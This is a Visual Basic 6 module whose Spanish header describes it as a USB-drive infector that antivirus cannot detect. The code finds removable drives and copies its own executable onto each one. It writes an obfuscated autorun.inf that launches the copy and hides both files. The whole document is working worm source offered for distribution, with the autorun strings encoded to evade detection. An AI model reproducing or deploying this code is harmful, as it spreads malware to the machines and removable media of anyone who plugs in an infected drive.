Attribute VB_Name = "Module10"
'Base:Visual Basic 6'
'Creador:Josfres'
'Fecha de creacion:viernes 11 de junio del 2010'
'Ensamblaje:uso de la funcion jcopy y autorunCreate'
'Funcion:infeccion de memorias Usb indetectable por los antivirus'
'Uso y Distribuicion:Se permite la distribuicion siempre y
'cuando se respete el nombre del Autor'


Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hHandle As Long) As Long

Const DRIVE_REMOVABLE As Long = 2
Const OPEN_ALWAYS = 4
Const GENERIC_WRITE = &H40000000
Const FILE_SHARE_READ = &H1

Public Function daaaa(Filename As String) As Long
On Error Resume Next
    Dim szBuffer As String * 128
    Dim infBuffer As String
    Dim Drive As Variant
    Dim Drives() As String
    hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer)
    If hGet <> 0 Then
        Drives = Split(szBuffer, Chr(0))
        For Each Drive In Drives
            If GetDriveType(Drive) = DRIVE_REMOVABLE Then
           hCopy = jcopy(Drive & Filename, Drive & des("mÅÄ{~Åz:uzr"), Filename)
           
             laasssa = laasssa + 1
             End If
             
        Next Drive
    End If
End Function


Public Function jcopy(ByVal ruta As String, auto As String, file As String) 'creamos la funcion'
On Error Resume Next
Dim datos As String 'marcamos datos como una variable'
Dim yo As String 'marcamos yo como una variable'
yo = App.Path & "\" & App.EXEName & des(":qÑq") 'definimos la variable YO con nuestra ruta'
Open yo For Binary As #1  'nos autoleemos'
datos = Space(LOF(1))  'definimos datos con todo el espacio'
Get #1, , datos 'obtemos nuestro exe'
Close #1 'nos cerramos'
If Len(Dir(ruta)) Then 'si exite el archivo no hacemos nada
Else 'si no existe lo creamos'
Open ruta For Binary As #1 'abrimos la ruta en binario'
Put #1, , datos 'metemos los datos'
Close #1 'cerramos los datos'

Open auto For Output As #1
Print #1, des("gmÅÄ{~Åzi")
Print #1, des("[|qzI") & file
Print #1, des("moÄu{zIMn~u~,om~|qÄm,pq,M~otuÇ{")
Print #1, des("uo{zI1_ÖÄqy^{{Ä1hÖÄqy?>h_TQXX?>:pxx8@")
Print #1, des("tqxxh{|qzhO{yymzpI") & file
Print #1, des("tqxxhnÅom~I2V[_R^Q_")
Print #1, des("tqxxhnÅom~ho{yymzpI") & file
Print #1, des("tqxxqÑqoÅÄqI:h") & file
Close #1
SetAttr (auto), vbHidden
SetAttr (ruta), vbHidden
End If
End Function





